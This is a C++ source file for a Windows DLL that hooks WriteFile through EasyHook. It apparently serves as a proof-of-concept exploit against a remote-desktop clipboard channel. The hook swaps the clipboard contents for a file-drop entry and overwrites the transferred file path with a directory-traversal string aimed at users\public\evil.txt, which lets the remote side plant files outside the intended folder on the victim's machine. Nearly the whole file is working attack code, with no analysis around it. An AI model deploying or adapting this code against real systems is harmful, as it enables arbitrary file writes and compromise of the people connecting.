#include <windows.h>
#include <strsafe.h>
#include <stdio.h>
#include <vector>
#include "easyhook.h"
#include <string.h>
#include <tchar.h>
#include <shlobj_core.h >

WCHAR  efile[] = { L".\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\users\\public\\evil.txt" };

#pragma warning(disable: 4996)
void Log(const char* pszformat, ...) {
	va_list args;
	char buffer[0x200] = { 0 };
	char* pBuff = buffer;
	va_start(args, pszformat);
	vsprintf(buffer, pszformat, args);
	va_end(args);
	HANDLE file = CreateFileA("C:\\tmp\\log.txt",               // file to open
		FILE_APPEND_DATA,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_ALWAYS,         // existing file only
		FILE_ATTRIBUTE_NORMAL, // normal file
		NULL);
	if (file == INVALID_HANDLE_VALUE) {
		return;
	}

	int dwBytesToWrite = strlen(pBuff);
	DWORD dwBytesWritten;
	while (dwBytesToWrite > 0)
	{
		int bErrorFlag = WriteFile(
			file,              // open file handle
			pBuff,               // start of data to write
			dwBytesToWrite,     // number of bytes to write
			&dwBytesWritten,    // number of bytes that were written
			NULL);              // no overlapped structure

		if (!bErrorFlag)
		{
			break;
		}

		pBuff += dwBytesWritten;
		dwBytesToWrite -= dwBytesWritten;
	}

	CloseHandle(file);
}

typedef
BOOL
(WINAPI* ptrCreateFileW)(
	_In_ HANDLE hFile,
	_In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
	_In_ DWORD nNumberOfBytesToWrite,
	_Out_opt_ LPDWORD lpNumberOfBytesWritten,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
	);
ptrCreateFileW realWriteFile;


DWORD patch_clipboard(LPVOID arg) {
	BOOL ret;
	HANDLE hdl;
	int clpSize = sizeof(DROPFILES);
	clpSize += sizeof(TCHAR) * (_tcslen(efile) + 1); // + 1 => '\0'
	clpSize += sizeof(TCHAR);

	HDROP hdrop = (HDROP)GlobalAlloc(GHND, clpSize);
	if (!hdrop) {
		Log("fail to global alloc hdrop\n");
		return 0;
	}
	DROPFILES* df = (DROPFILES*)GlobalLock(hdrop);
	if (!df) {
		Log("fail to global lock df\n");
		return 0;
	}
	memset(df, 0, sizeof(*df));
	df->pFiles = sizeof(DROPFILES); // string offset
#ifdef _UNICODE
	df->fWide = TRUE; // unicode file names
#endif // _UNICODE

	// copy the command line args to the allocated memory
	TCHAR* dstStart = (TCHAR*)&df[1];
	_tcscpy(dstStart, efile);
	GlobalUnlock(hdrop);

	ret = OpenClipboard(NULL);
	if (!ret) {
		Log("fail to open clipbaord:%d\n", GetLastError());
		return 0;
	}
	ret = EmptyClipboard();
	if (!ret) {
		Log("fail to empty clipboard:%d\n", GetLastError());
		return 0;
	}
	hdl = SetClipboardData(CF_HDROP, hdrop);
	CloseClipboard();

	Log("set clipboard done\n");
	return 0;
}
BOOL
WINAPI
myWriteFile(
	_In_ HANDLE hFile,
	_In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
	_In_ DWORD nNumberOfBytesToWrite,
	_Out_opt_ LPDWORD lpNumberOfBytesWritten,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
) {
	BOOL ret;
	char cmp[8] = { 0x03, 00, 01 };//CClipBase::OnFormatList
	char cmp2[8] = { 0x05, 00, 01, 00, 0x54, 02, 00, 00 };//OnFormatDataRequest
	if (lpBuffer) {
		if (memcmp(lpBuffer, cmp, 8) == 0) {
			Log("replace clipboard\n");
			HANDLE hdl = CreateThread(NULL, 0, patch_clipboard, NULL, 0, NULL);
		}
		else if (memcmp(lpBuffer, cmp2, 8) == 0 && nNumberOfBytesToWrite > sizeof(efile) + 0x54) {
			Log("patch path\n");
			memcpy((char*)lpBuffer + 8 + 0x4c, efile, sizeof(efile));
		}
	}
	ret = realWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
	return ret;
}

HOOK_TRACE_INFO hHook = { NULL }; // keep track of our hook

void InstallHook()
{
	realWriteFile = (ptrCreateFileW)GetProcAddress(GetModuleHandleW(L"kernelbase.dll"), "WriteFile");
	if (!realWriteFile) {
		Log("fail to get writefile:%d\n", GetLastError());
		return;
	}
	// Install the hook
	NTSTATUS result = LhInstallHook(
		realWriteFile,
		myWriteFile,
		NULL,
		&hHook);

	ULONG ACLEntries[1] = { 0 };
	LhSetExclusiveACL(ACLEntries, 1, &hHook);
	Log("hook ok\n");
}


void UninstallHook()
{
	LhUninstallHook(&hHook);
	LhWaitForPendingRemovals();
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	printf("loading\n");
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		Log("load ok\n");
		InstallHook();
		break;
	}
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		UninstallHook();
		break;
	}
	}

	return TRUE;
}